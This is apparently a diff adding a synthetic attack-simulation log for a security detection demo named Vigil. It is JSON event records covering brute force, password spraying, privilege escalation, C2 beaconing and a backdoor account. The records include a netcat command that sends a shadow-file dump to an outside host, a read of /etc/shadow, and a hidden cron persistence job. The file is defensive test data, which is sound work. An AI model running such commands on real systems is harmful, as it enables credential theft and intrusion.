@@ -1,0 +1,98 @@
+# Vigil Demo Attack Simulation Log
+# Generated: 2026-05-13T22:21:52.454641+00:00
+# Events: 81
+#
+# Attack timeline:
+#   t=0-120    Benign background traffic
+#   t=200-270  SSH brute force -> lateral movement (vigil-001, vigil-011)
+#   t=300-430  Password spray campaign (vigil-002)
+#   t=450-510  Port scan -> auth attempt recon chain (vigil-014)
+#   t=540-620  Sudo failure storm + privilege escalation (vigil-003, vigil-012)
+#   t=640-695  Credential dump + exfiltration (vigil-006, vigil-007, vigil-013)
+#   t=720-790  Web application brute force (vigil-008)
+#   t=810-870  Account lockout storm (vigil-010)
+#   t=900-1800 C2 beacon traffic (vigil-009)
+#   t=1850-1870 Persistence backdoor chain (vigil-004, vigil-005, vigil-015)
+#   t=1980-2100 Benign background traffic
+#
+{"timestamp": "2026-05-13T02:00:00+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.5", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:00:05+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "1.1.1.1", "dest_port": 443}
+{"timestamp": "2026-05-13T02:00:12+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.5", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:00:24+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.8", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:00:25+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "172.64.0.1", "dest_port": 443}
+{"timestamp": "2026-05-13T02:00:30+00:00", "event_type": "cron_modified", "host": "web-prod-01", "user": "root", "cron_file": "/etc/cron.d/backup", "detail": "Added nightly backup job"}
+{"timestamp": "2026-05-13T02:00:36+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.5", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:00:45+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "104.16.0.1", "dest_port": 443}
+{"timestamp": "2026-05-13T02:00:48+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.22", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:01:00+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.19", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:01:00+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.5", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:01:05+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "172.64.0.1", "dest_port": 443}
+{"timestamp": "2026-05-13T02:01:12+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.22", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:01:24+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.5", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:01:25+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "104.16.0.1", "dest_port": 443}
+{"timestamp": "2026-05-13T02:01:30+00:00", "event_type": "sudo_success", "user": "alice", "host": "web-prod-01", "command": "/usr/bin/systemctl restart nginx"}
+{"timestamp": "2026-05-13T02:03:20+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "admin"}
+{"timestamp": "2026-05-13T02:03:28+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "ubuntu"}
+{"timestamp": "2026-05-13T02:03:36+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "root"}
+{"timestamp": "2026-05-13T02:03:44+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "root"}
+{"timestamp": "2026-05-13T02:03:52+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "ec2-user"}
+{"timestamp": "2026-05-13T02:04:00+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "ec2-user"}
+{"timestamp": "2026-05-13T02:04:08+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "ubuntu"}
+{"timestamp": "2026-05-13T02:04:30+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "deploy"}
+{"timestamp": "2026-05-13T02:05:00+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:05:13+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "bob"}
+{"timestamp": "2026-05-13T02:05:26+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "charlie"}
+{"timestamp": "2026-05-13T02:05:39+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "david"}
+{"timestamp": "2026-05-13T02:05:52+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "eve"}
+{"timestamp": "2026-05-13T02:06:05+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "frank"}
+{"timestamp": "2026-05-13T02:06:18+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "grace"}
+{"timestamp": "2026-05-13T02:06:31+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "henry"}
+{"timestamp": "2026-05-13T02:06:44+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "iris"}
+{"timestamp": "2026-05-13T02:06:57+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "user": "james"}
+{"timestamp": "2026-05-13T02:07:30+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "185.220.101.47", "dest_ip": "10.0.1.35", "dest_port": 22, "scan_detected": "true", "detail": "Nmap SYN scan detected by IDS"}
+{"timestamp": "2026-05-13T02:07:40+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "185.220.101.47", "dest_ip": "10.0.1.35", "dest_port": 3306, "scan_detected": "true"}
+{"timestamp": "2026-05-13T02:07:55+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "185.220.101.47", "dest_ip": "10.0.1.35", "dest_port": 5432, "scan_detected": "true"}
+{"timestamp": "2026-05-13T02:08:30+00:00", "event_type": "auth_failure", "service": "sshd", "src_ip": "185.220.101.47", "dest_host": "db-prod-02", "user": "root"}
+{"timestamp": "2026-05-13T02:09:00+00:00", "event_type": "sudo_failure", "user": "deploy", "host": "web-prod-01", "command": "sudo su -"}
+{"timestamp": "2026-05-13T02:09:12+00:00", "event_type": "sudo_failure", "user": "deploy", "host": "web-prod-01", "command": "sudo su -"}
+{"timestamp": "2026-05-13T02:09:24+00:00", "event_type": "sudo_failure", "user": "deploy", "host": "web-prod-01", "command": "sudo su -"}
+{"timestamp": "2026-05-13T02:09:36+00:00", "event_type": "sudo_failure", "user": "deploy", "host": "web-prod-01", "command": "sudo su -"}
+{"timestamp": "2026-05-13T02:10:20+00:00", "event_type": "sudo_success", "user": "deploy", "host": "web-prod-01", "command": "sudo su -", "detail": "Privilege escalation to root"}
+{"timestamp": "2026-05-13T02:10:40+00:00", "event_type": "file_access", "host": "web-prod-01", "user": "root", "file_path": "/etc/shadow", "access_type": "read", "process": "python3", "detail": "Direct read of shadow file"}
+{"timestamp": "2026-05-13T02:10:50+00:00", "event_type": "file_access", "host": "web-prod-01", "user": "root", "file_path": "/etc/passwd", "access_type": "read", "process": "python3"}
+{"timestamp": "2026-05-13T02:11:35+00:00", "event_type": "process_exec", "host": "web-prod-01", "user": "root", "process": "nc", "args": "-w3 91.108.4.200 4444 < /tmp/.shadow_dump", "detail": "Netcat exfiltration of credential dump"}
+{"timestamp": "2026-05-13T02:12:00+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:05+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:10+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:15+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:20+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:25+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:30+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:35+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:40+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:45+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:50+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:12:55+00:00", "event_type": "http_auth_failure", "src_ip": "185.220.101.47", "dest_host": "web-prod-01", "path": "/admin/login", "user_agent": "python-requests/2.31.0", "status_code": 401}
+{"timestamp": "2026-05-13T02:13:30+00:00", "event_type": "account_lockout", "dest_host": "web-prod-01", "user": "alice", "detail": "Account locked after repeated failures"}
+{"timestamp": "2026-05-13T02:13:50+00:00", "event_type": "account_lockout", "dest_host": "web-prod-01", "user": "bob", "detail": "Account locked after repeated failures"}
+{"timestamp": "2026-05-13T02:14:10+00:00", "event_type": "account_lockout", "dest_host": "web-prod-01", "user": "charlie", "detail": "Account locked after repeated failures"}
+{"timestamp": "2026-05-13T02:15:00+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:16:25+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:17:50+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:19:15+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:20:40+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:22:05+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:23:30+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:24:55+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:26:20+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:27:45+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "91.108.4.200", "dest_port": 443, "bytes_out": 128, "bytes_in": 64, "detail": "Regular beacon interval ~85s"}
+{"timestamp": "2026-05-13T02:30:50+00:00", "event_type": "user_created", "host": "web-prod-01", "user": "root", "new_user": "svcbackup", "shell": "/bin/bash", "home": "/var/lib/svcbackup", "detail": "Backdoor account created with home directory"}
+{"timestamp": "2026-05-13T02:31:10+00:00", "event_type": "cron_modified", "host": "web-prod-01", "user": "root", "cron_file": "/etc/cron.d/svcbackup", "detail": "Added cron: */5 * * * * svcbackup /var/lib/svcbackup/.update >/dev/null 2>&1"}
+{"timestamp": "2026-05-13T02:33:00+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.8", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:33:20+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.22", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:33:40+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.19", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:34:00+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.5", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:34:10+00:00", "event_type": "sudo_success", "user": "alice", "host": "web-prod-01", "command": "/usr/bin/apt-get update"}
+{"timestamp": "2026-05-13T02:34:20+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.12", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:34:40+00:00", "event_type": "auth_success", "service": "sshd", "src_ip": "10.0.1.8", "dest_host": "web-prod-01", "user": "alice"}
+{"timestamp": "2026-05-13T02:34:40+00:00", "event_type": "network_conn", "direction": "outbound", "src_ip": "10.0.1.20", "dest_ip": "8.8.8.8", "dest_port": 53, "detail": "DNS query"}
